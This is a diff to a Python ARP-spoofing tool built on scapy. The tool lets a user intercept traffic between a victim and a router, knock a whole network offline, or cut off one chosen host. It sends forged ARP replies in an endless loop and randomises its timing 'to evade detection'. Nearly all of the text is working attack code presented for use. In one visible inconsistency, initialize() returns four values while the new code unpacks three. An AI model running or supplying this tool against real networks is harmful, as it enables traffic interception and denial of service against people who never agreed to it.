@@ -48,45 +48,59 @@ def initialize():
     attacker = Attacker([attackerIP, attackerMAC])
     return (network, attacker, victimList,broadcastIP)
 
+#generate random MAC address
+def generateMAC(seed_value):
+    mac = ""
+    seed(seed_value)
+    for i in range(6):
+        char1 = hex(randint(0, 15))[2:] #remove 0x from the beginnign of the hex
+        char2 = hex(randint(0, 15))[2:]
+        mac += char1 + char2 + ":"
+    return mac[:-1] #remove trailing ":"
+
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     takedown=False
     specific=False
-    process= initialize()
-    (network, attacker, victimsList,broadcastIP)=process
+    # seed(655)
+    (network, attacker, victimsList) = initialize()
     Color.pl("{+} " + network.toString())
     Color.pl("{+} " + attacker.toString())
     for e in victimsList:
         Color.pl("{!} " + e.toString())
 
-    op = 1  # Op code 1 for ARP requests
+    # select type of attack
     while(True):
-        Color.pl("{?} What type of ARP attack do you want to perform? \n (Man-in-the-middle[1] or Take down the network![2] or Attack specific victim[3]?)")
-        selection = input().lower()
+        Color.pl("{?} What type of ARP attack do you want to perform? \n {C}Man-in-the-middle[1] {W}or {O}Take down the network![2] {W}or {P}{D}Attack specific victim[3]?)")
+        selection = input()
         routerIP=network.ip
+        # attacking down the whole network by specifying a non existent MAC
         if selection.lower() == "2":
-            ip=broadcastIP
-            mac="34:23:fe:3a:3e:10" #random
-            takedown=True
+            takedown = True
+            ip=network.broadcastIP
+            mac=generateMAC(randint(0, 655)) #random
+            break
+        # attacking a specific target and not allowing it to connect to the internet by specifying a non existent MAC
+        elif selection.lower()=="3":
+            specific=True
+            mac=generateMAC(randint(0, 655)) #random
+            break
+        # Man in the Middle needs handling that is done later
+        elif selection.lower() == "1":
             break
         else:
-            if selection.lower()=="3":
-                specific=True
-                mac="34:23:fe:3a:3e:10" #random
-                break
-            else:
-                if selection.lower()=="1":
-                    break
-                else:
-                    Color.pl("{!} Invalid Input")
-    while(takedown==False):
+            Color.pl("{!} Invalid Input")
+
+    while(not takedown):
         Color.pl("{?} Do you want to enter the target manually? (y or n)")
         selection = input().lower()
         if selection.lower() == "y":
             Color.pl("{+} Enter target IP address ")
             ip = input().strip()
-            Color.pl("{+} Enter target MAC address ")
-            mac = input().strip()
+            if not specific:
+                Color.pl("{+} Enter target MAC address ")
+                mac = input().strip()
             break
         elif selection.lower() == "n":
             for i in range(len(victimsList)):
@@ -94,11 +108,13 @@ if __name__ == '__main__':
             Color.pl("{+} Enter Index of Target")
             index = int(input())
             ip = victimsList[index].ip
+            if not specific:
+                mac = victimsList[index].mac
             break
         else:
             Color.pl("{!} Invalid Input")
 
-    while(takedown==False):
+    while(not takedown):
         Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
         selection = input().lower()
         if selection.lower() == "y":
@@ -111,42 +127,41 @@ if __name__ == '__main__':
         else:
             Color.pl("{!} Invalid Input")
 
-    Color.pl("{+} {R} Router IP: {G}" + routerIP)
+    # printing Target IP, IP and MAC Entry that is getting changed
     Color.pl("{+} {R} Target IP: {G}" + ip)
+    Color.pl("{+} {R} ARP table changed combination IP: {G}" + routerIP + "  {R} MAC: {G}" + mac)
     time.sleep(2)
-    
+
     Color.pl("{+} Processing :) ")
-    
-    if (takedown==False and specific==False):
-        arp= ARP(op=2, psrc=routerIP, pdst=ip)
-        arp2= ARP(op=2, psrc=ip, pdst=routerIP)
-    else:
-        arp = ARP(op=2, psrc=routerIP, pdst=ip, hwsrc=mac)
 
-        
-            
-    
+    '''
+    pdst is the ip of the target that we want to change its ARP table
+    psrc is the ip in the ARP table that we want to change its associated MAC address
+    hwsrc is the MAC address that we replace with in the ARP table, no value for it uses the MAC of the attacker
 
-    while 1:
-        if (takedown==False and specific==False):
-            send(arp)
-            send(arp2)
+    Every time we send an ARP message, we also send one to change the attacker IP and MAC in order to not have 
+    duplicate MAC in the ARP table 
+    '''
+
+    if (not takedown and not specific): #man in the middle needs to change ARP table for both router and target
+        arp_target_router = ARP(op=2, psrc=routerIP, pdst=ip)
+        arp_target_attacker = ARP(op=2, psrc=attacker.ip, pdst=ip, hwsrc=generateMAC(randint(0, 655)))
+        arp_router = ARP(op=2, psrc=ip, pdst=routerIP)
+        while 1:
+            send(arp_target_router)
+            send(arp_target_attacker)
+            send(arp_router)
             time.sleep(1)
-        else:
-            seed(655)
-            counter=0
-            while 1:
-                 if (counter % 5 == 0):
-                    op = randint(1, 2)
-                    s = randint(1, 3)
-                    arp = ARP(op=op, psrc=routerIP, pdst=ip, hwsrc=mac)
-                    send(arp)
-                    # lower sleep timer to make it better, victim ajusts ARP table otherwise
-                    time.sleep(s)
-                    
-                    send(arp)
-            
-                    time.sleep(1)
-                 counter += 1
-
-
+    else:
+        counter=0
+        while 1:
+            #randomizer to evade detection
+            if (counter % 5 == 0):
+                op = randint(1, 2)
+                s = randint(0, 2)
+            counter += 1
+            # creating the arp packet using scapy
+            arp = ARP(op=op, psrc=routerIP, pdst=ip, hwsrc=mac)
+            send(arp)
+            # lower sleep timer to make it better, victim ajusts ARP table otherwise
+            time.sleep(s)
